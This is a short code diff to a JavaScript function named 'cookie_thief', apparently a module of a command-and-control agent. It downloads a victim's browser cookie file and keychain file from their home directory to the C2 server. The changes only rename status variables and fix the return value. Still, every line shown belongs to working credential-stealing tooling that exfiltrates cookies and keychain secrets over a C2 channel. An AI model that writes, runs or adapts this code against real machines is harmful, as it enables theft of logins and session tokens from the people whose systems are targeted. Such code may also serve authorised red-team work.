@@ -33,9 +33,9 @@ exports.cookie_thief = function(task, command, params){
     console.log(cookieDLPath)
 
     try{
-        let status = C2.download(task, cookieDLPath);
-    	  if(status.hasOwnProperty("file_id")){
-    	      status['user_output'] = "Finished Downloading";
+        let cookieDL_status = C2.download(task, cookieDLPath);
+    	  if(cookieDL_status.hasOwnProperty("file_id")){
+    	      cookieDL_status['user_output'] = "Finished Downloading";
         }
     }
     catch(error)  {
@@ -44,13 +44,13 @@ exports.cookie_thief = function(task, command, params){
 
     keypath = homedir + username + "/" + keychainpath;
     try{
-        let status = C2.download(task, keypath);
-    	  if(status.hasOwnProperty("file_id")){
-    	      status['user_output'] = "Finished Downloading";
+        let keyDL_status = C2.download(task, keypath);
+    	  if(keyDL_status.hasOwnProperty("file_id")){
+    	      keyDL_status['user_output'] = "Finished Downloading";
         }
     }
     catch(error)  {
         return {'user_output': error.toString(), "completed": true, "status": "error"};
     }
-    return status;
+    return keyDL_status;
 };
